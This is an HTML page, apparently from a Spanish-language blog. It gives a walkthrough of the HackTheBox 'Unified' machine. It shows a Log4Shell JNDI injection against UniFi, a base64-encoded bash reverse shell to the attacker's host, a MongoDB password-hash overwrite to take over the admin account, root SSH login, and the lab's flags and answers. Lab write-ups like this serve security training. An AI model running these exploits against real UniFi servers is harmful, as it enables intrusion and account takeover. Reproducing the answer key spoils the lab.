@@ -1,0 +1,253 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Unified HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/unified.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Unified HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Unified de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Unified de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Unified HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Unified HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Unified de la plataforma de HackTheBox","headline":"Writeup Unified HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Unified HackTheBox</h1>
+          <p>Resolución de la máquina Unified de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.96.149
+Nmap scan report for 10.129.96.149
+PORT     STATE SERVICE
+22/tcp   open  ssh
+6789/tcp open  ibm-db2-admin
+8080/tcp open  http-proxy
+8443/tcp open  https-alt</span>
+</code></pre></div></div>
+
+<div><p>Al abrir la web de el puerto 8443 podemos ver un login de UniFi versión 6.4.54</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Enviamos cualquier cosa y al interceptar la petición vemos una estructura en json</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Podemos explotar un <a href="https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi">log4j</a> siguiendo los pasos, podemos inciando probando si es vulnerable</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">${jndi:ldap://10.10.14.10/whatever}</span>
+</code></pre></div></div>
+
+<div><p>Esa estructura hara una peticion a ldap si es vulnerable, asi que nos ponemos en escucha</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo tcpdump</span><span class="p"> -i tun0 port 389
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes</span>
+</code></pre></div></div>
+
+<div><p>Enviamos el payload en el campo remember y enviamos la petición</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Al enviarlo recibimos una petición en el puerto 389, hemos comprobado que es vulnerable</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo tcpdump</span><span class="p"> -i tun0 port 389
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+22:52:09.567754 IP 10.129.96.149.58560 > 10.10.14.10.ldap: Flags [S], seq 173732455, win 64240, options [mss 1340,sackOK,TS val 2580744273 ecr 0,nop,wscale 7], length 0
+22:52:09.567853 IP 10.10.14.10.ldap > 10.129.96.149.58560: Flags [R.], seq 0, ack 173732456, win 0, length 0</span>
+</code></pre></div></div>
+
+<div><p>Para preparar la explotación clonamos el repositorio rogue-jndi y cargamos los recursos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ git </span><span class="p">clone https://github.com/veracode-research/rogue-jndi
+
+</span><span class="s2">❯ cd </span><span class="p">rogue-jndi
+
+</span><span class="c1">rogue-jndi </span><span class="s2">❯ mvn </span><span class="p">package</span>
+</code></pre></div></div>
+
+<div><p>Preparamos el comando en base64 que nos envie una reverse shell ya que sera nuestro payload</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo </span><span class="no">'bash -c bash -i >&/dev/tcp/10.10.14.10/443 0>&1' </span><span class="p">| </span><span class="s2">base64</span><span class="p">
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTAvNDQzIDA+JjEK</span>
+</code></pre></div></div>
+
+<div><p>Ahora ejecutamos el archivo java pasandole el payload en command y nuestra ip como hostname</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">rogue-jndi </span><span class="s2">❯ java </span><span class="p">-jar target/RogueJndi-1.1.jar --command </span><span class="no">'bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTAvNDQzIDA+JjEK}|{base64,-d}|{bash,-i}' </span><span class="p">--hostname 10.10.14.10
++-+-+-+-+-+-+-+-+-+
+|R|o|g|u|e|J|n|d|i|
++-+-+-+-+-+-+-+-+-+
+Starting HTTP server on 0.0.0.0:8000
+Starting LDAP server on 0.0.0.0:1389
+Mapping ldap://10.10.14.10:1389/o=groovy to artsploit.controllers.Groovy
+Mapping ldap://10.10.14.10:1389/ to artsploit.controllers.RemoteReference
+Mapping ldap://10.10.14.10:1389/o=reference to artsploit.controllers.RemoteReference
+Mapping ldap://10.10.14.10:1389/o=websphere2 to artsploit.controllers.WebSphere2
+Mapping ldap://10.10.14.10:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
+Mapping ldap://10.10.14.10:1389/o=tomcat to artsploit.controllers.Tomcat
+Mapping ldap://10.10.14.10:1389/o=websphere1 to artsploit.controllers.WebSphere1
+Mapping ldap://10.10.14.10:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1</span>
+</code></pre></div></div>
+
+<div><p>Esta en escucha en el 1389/o=tomcat asi que enviamos el payload hacia esa dirección</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">${jndi:ldap://10.10.14.10:1389/o=tomcat}</span>
+</code></pre></div></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Al hacer eso recibimos una shell como unifi en la máquina victima</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.96.149
+script /dev/null -c bash
+Script started, file is /dev/null
+</span><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">/usr/lib/unifi</span><span class="p">$ id
+uid=999(unifi) gid=999(unifi) groups=999(unifi)
+</span><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">/usr/lib/unifi</span><span class="p">$ hostname -I
+10.129.96.149 172.17.0.1 dead:beef::250:56ff:feb9:c860 
+</span><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">/usr/lib/unifi</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En el home de michael esta la flag y tenemos capacidad de lectura asi que leemos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">/home/michael</span><span class="p">$ ls -l
+-rw-r--r-- 1 root 1000 33 Dec 30  2021 user.txt
+</span><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">/home/michael</span><span class="p">$ cat user.txt 
+6ced1a6a89e666c0620cdb10262ba127
+</span><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">/home/michael</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando un poco los procesos podemos ver que mongo esta corriendo en el puerto 27117</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">~</span><span class="p">$ ps faux | grep mongo
+unifi         67  0.6  4.1 1104772 85448 ?       Sl   20:11   0:04      \_ bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+</span><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Conectandonos con mongo podemos ver el id y el hash de la contraseña de administrator</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">~</span><span class="p">$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);" | grep administrator -A1 -B1
+	</span><span class="na">"_id" </span><span class="p">: ObjectId(</span><span class="s2">"61ce278f46e0fb0012d47ee4"</span><span class="p">),
+	</span><span class="na">"name"</span><span class="p"> : </span><span class="s2">"administrator"</span><span class="p">,
+	</span><span class="na">"email"</span><span class="p"> : </span><span class="s2">"administrator@unified.htb"</span><span class="p">,
+	</span><span class="na">"x_shadow"</span><span class="p"> : </span><span class="s2">"$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4."</span><span class="p">,
+</span><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos crear un hash con la misma estructura pero con la contraseña admin123!</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ mkpasswd</span><span class="p"> -m sha-512 admin123!
+$6$5I6lPYLJ.ssUBm7n$HLwrn0IFjfmsaoi8sPXFg1oizJTybO/ZdGuB4YAiv2uDQDzCCM.eYwZjZpELNz2Ljvt1beNI7DJjTNTZuNx.J1</span>
+</code></pre></div></div>
+
+<div><p>Ahora con mongo podemos actualizar la contrasña de administrator a admin123!</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">~</span><span class="p">$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$5I6lPYLJ.ssUBm7n$HLwrn0IFjfmsaoi8sPXFg1oizJTybO/ZdGuB4YAiv2uDQDzCCM.eYwZjZpELNz2Ljvt1beNI7DJjTNTZuNx.J1"}})'
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 0 })
+</span><span class="s2">unifi@unified</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Con esto realizado podemos ingresar como administrator con la contraseña admin123!</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Al iniciar sesión conseguimos acceder al panel de administración de unifi</p></div>
+<a href="./6.png" target="_blank"><div><p><img src="./6.png"><p></div></a>
+
+<div><p>En settings podemos ver una pestaña site, donde podemos hacer modificaciones</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Ahi podemos ver un apartado de autenticación donde nos comparten credenciales para ssh</p></div>
+<a href="./8.png" target="_blank"><div><p><img src="./8.png"><p></div></a>
+
+<div><p>Podemos conectarnos por ssh con la contraseña y leer la ultima flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">root@10.129.96.149
+root@10.129.96.149's password: </span><span class="kd">NotACrackablePassword4U2022
+</span><span class="s2">root@unified</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@unified</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.129.96.149 172.17.0.1 dead:beef::250:56ff:feb9:c860 
+</span><span class="s2">root@unified</span><span class="p">:</span><span class="na">~</span><span class="p"># cat root.txt 
+e50bc93c75b634e4b272d2f771c33681
+</span><span class="s2">root@unified</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>Which are the first four open ports?</strong></li>
+<ul><p></p><li>22,6789,8080,8443</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the title of the software that is running running on port 8443?</strong></li>
+<ul><p></p><li>UniFi Network</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the version of the software that is running?</strong></li>
+<ul><p></p><li>6.4.54</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the CVE for the identified vulnerability?</strong></li>
+<ul><p></p><li>CVE-2021-44228</li></ul></blockquote><br>
+
+<blockquote><li><strong>What protocol does JNDI leverage in the injection?</strong></li>
+<ul><p></p><li>ldap</li></ul></blockquote><br>
+
+<blockquote><li><strong>What tool do we use to intercept the traffic, indicating the attack was successful?</strong></li>
+<ul><p></p><li>tcpdump</li></ul></blockquote><br>
+
+<blockquote><li><strong>What port do we need to inspect intercepted traffic for?</strong></li>
+<ul><p></p><li>389</li></ul></blockquote><br>
+
+<blockquote><li><strong>What port is the MongoDB service running on?</strong></li>
+<ul><p></p><li>27117</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the default database name for UniFi applications?</strong></li>
+<ul><p></p><li>ace</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the function we use to enumerate users within the database in MongoDB?</strong></li>
+<ul><p></p><li>db.admin.find()</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the function we use to update users within the database in MongoDB?</strong></li>
+<ul><p></p><li>db.admin.update()</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the password for the root user?</strong></li>
+<ul><p></p><li>NotACrackablePassword4U2022</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit user flag</strong></li>
+<ul><p></p><li>6ced1a6a89e666c0620cdb10262ba127</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>e50bc93c75b634e4b272d2f771c33681</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
